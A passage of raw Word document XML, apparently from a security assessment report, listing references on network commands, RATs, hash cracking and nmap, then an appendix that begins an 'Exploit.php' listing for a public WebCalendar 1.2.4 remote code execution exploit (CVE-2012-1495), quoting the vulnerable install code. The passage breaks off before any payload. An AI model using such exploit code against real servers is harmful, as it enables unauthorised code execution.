              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
                <w:rPr>
                  <w:b/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="0679D208" w14:textId="77777777" w:rsidR="002B5CA3" w:rsidRDefault="002B5CA3" w:rsidP="009525A9">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId40" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://www.lifewire.com/net-use-command-2618096</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> [Accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0A7B29B8" w14:textId="77777777" w:rsidR="001F3FFC" w:rsidRDefault="001F3FFC" w:rsidP="009525A9">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="31FC1CC9" w14:textId="77777777" w:rsidR="001F3FFC" w:rsidRDefault="00425B82" w:rsidP="001F3FFC">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId41" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:r w:rsidR="001F3FFC">
                <w:t xml:space="preserve"> [Accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2FE9138D" w14:textId="77777777" w:rsidR="006E1215" w:rsidRDefault="006E1215" w:rsidP="001F3FFC">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId42" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://searchsecurity.techtarget.com/definition/RAT-remote-access-Trojan</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:bookmarkStart w:id="27" w:name="_Hlk27510913"/>
              <w:r>
                <w:t>[Accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
            <w:bookmarkEnd w:id="27"/>
            <w:p w14:paraId="1B9FDB78" w14:textId="77777777" w:rsidR="006939AB" w:rsidRDefault="006939AB" w:rsidP="001F3FFC">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="5EB35CDD" w14:textId="77777777" w:rsidR="006939AB" w:rsidRDefault="006939AB" w:rsidP="006939AB">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId43" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://www.dionach.com/blog/active-directory-password-auditing-part-2-cracking-the-hashes</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> [Accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="21FE750F" w14:textId="77777777" w:rsidR="006939AB" w:rsidRDefault="006939AB" w:rsidP="001F3FFC">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="39DD9412" w14:textId="77777777" w:rsidR="00425B82" w:rsidRDefault="00425B82" w:rsidP="00425B82">
              <w:pPr>
                <w:ind w:left="19" w:right="919"/>
              </w:pPr>
              <w:hyperlink r:id="rId44" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                  </w:rPr>
                  <w:t>https://nmap.org/book/man.html</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:t xml:space="preserve"> [Accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0486454B" w14:textId="77777777" w:rsidR="005201BA" w:rsidRDefault="005201BA">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="2E1CFE0D" w14:textId="77777777" w:rsidR="00FA314C" w:rsidRDefault="00FA314C">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:hyperlink r:id="rId45" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>http://www.fastandeasyhacking.com/manual</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
              <w:r>
                <w:t>[Accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="294B0E38" w14:textId="77777777" w:rsidR="003B009F" w:rsidRDefault="003B009F">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="3F6D377C" w14:textId="77777777" w:rsidR="00801886" w:rsidRPr="006E34CB" w:rsidRDefault="00FA314C">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:hyperlink r:id="rId46" w:history="1">
                <w:r w:rsidRPr="003C6B88">
                  <w:rPr>
                    <w:rStyle w:val="Hyperlink"/>
                    <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                    <w:lang w:eastAsia="en-US"/>
                  </w:rPr>
                  <w:t>https://support.microsoft.com/en-gb/help/243330/well-known-security-identifiers-in-windows-operating-systems</w:t>
                </w:r>
              </w:hyperlink>
              <w:r>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> [accessed 17.12.19]</w:t>
              </w:r>
            </w:p>
          </w:sdtContent>
        </w:sdt>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="5BF67247" w14:textId="77777777" w:rsidR="006C6590" w:rsidRDefault="006C6590">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="188AECA8" w14:textId="77777777" w:rsidR="00341658" w:rsidRDefault="00341658">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:smallCaps/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="36"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A59ADC" w14:textId="77777777" w:rsidR="00801886" w:rsidRPr="009A241B" w:rsidRDefault="00341658" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="431"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc27518414"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="0032BBBF" w14:textId="77777777" w:rsidR="009A241B" w:rsidRDefault="00341658" w:rsidP="00341658">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc27518415"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="009525A9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="35594F5A" w14:textId="77777777" w:rsidR="009525A9" w:rsidRDefault="009525A9" w:rsidP="009525A9">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Put any large amounts of data here (e.g. code).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E45F5AE" w14:textId="77777777" w:rsidR="00BA7AE1" w:rsidRDefault="00BA7AE1" w:rsidP="009525A9">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CEEEF1A" w14:textId="77777777" w:rsidR="00BA7AE1" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Courier New" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="20"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Exploit.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15577896" w14:textId="77777777" w:rsidR="009A241B" w:rsidRDefault="009A241B" w:rsidP="00BA7AE1">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57B9D88D"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&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB56CB2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E17A97A"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CCD8BBB"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 xml:space="preserve">    -----------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647659AD"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 xml:space="preserve">    WebCalendar &lt;= 1.2.4 (install/index.php) Remote Code Executionn Exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5B2C66"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 xml:space="preserve">    -----------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C303C5"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7477AE"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 xml:space="preserve">    author..........: Egidio Romano aka EgiX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E202341"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 xml:space="preserve">    mail............: n0b0d13s[at]gmail[dot]com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F554AC"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 xml:space="preserve">    software link...: https://sourceforge.net/projects/webcalendar/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBE1F13" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47BB1EE0"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 xml:space="preserve">    +-------------------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709C64B1"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 xml:space="preserve">    | This proof of concept code was written for educational purpose only.    |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACFDB07"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 xml:space="preserve">    | Use it at your own risk. Author will be not responsible for any damage. |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531277C7"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 xml:space="preserve">    +-------------------------------------------------------------------------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0689FE24"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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E74D51"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 xml:space="preserve">    [-] vulnerable code in /install/index.php (CVE-2012-1495)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228E1D01" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:spacing w:after="1" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="-5" w:right="1119"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40FB7D84"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 xml:space="preserve">    674.    $y = getPostValue </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>app_settings' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0AF5BE"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 xml:space="preserve">    675.    if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( !</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> empty ( $y ) ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8223C2"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 xml:space="preserve">    676.      $settings['single_user_login'] = getPostValue </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>form_single_user_login' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A2A9FD"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 xml:space="preserve">    677.      $settings['readonly'] = getPostValue </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>form_readonly' );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78600096"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 xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160364BE"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 xml:space="preserve">    724.      // Save settings to file now.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3C9661"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 xml:space="preserve">    725.    if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( !</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> empty ( $x ) || ! empty ( $y ) ){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E61DA68"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 xml:space="preserve">    726.      $fd = @fopen </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( $</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>file, 'w+b', false );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B04B973"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 xml:space="preserve">    727.      if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( empty</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> ( $fd ) ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4B3962"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 xml:space="preserve">    728.        if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( @</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>file_exists ( $file ) ) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E53ED1"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 xml:space="preserve">    729.          $onloadDetailStr =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA7A613"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 xml:space="preserve">    730.            translate </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Please change the file permissions of this file', true );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269B120D"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 xml:space="preserve">    731.      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  }</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26104CD3"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 xml:space="preserve">    732.          $onloadDetailStr =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5FF4CC"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 xml:space="preserve">    733.            translate </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( '</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Please change includes dir permission', true );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3F0E27"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">    734.      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  }</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="440EB20E"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 xml:space="preserve">    735.        $onload = "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'" . $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>errorFileWriteStr .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> $file. "\\n</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>" .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="02D18C4C"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 xml:space="preserve">    736.          $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>onloadDetailStr .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> ".');";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFFDE7B"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 xml:space="preserve">    737.    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  }</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6206E83B"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 xml:space="preserve">    738.        if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( function</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>_exists ( "date_default_timezone_set" ) )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E07FE38"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 xml:space="preserve">    739.          date_default_timezone_set </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>( "</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED2F72">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
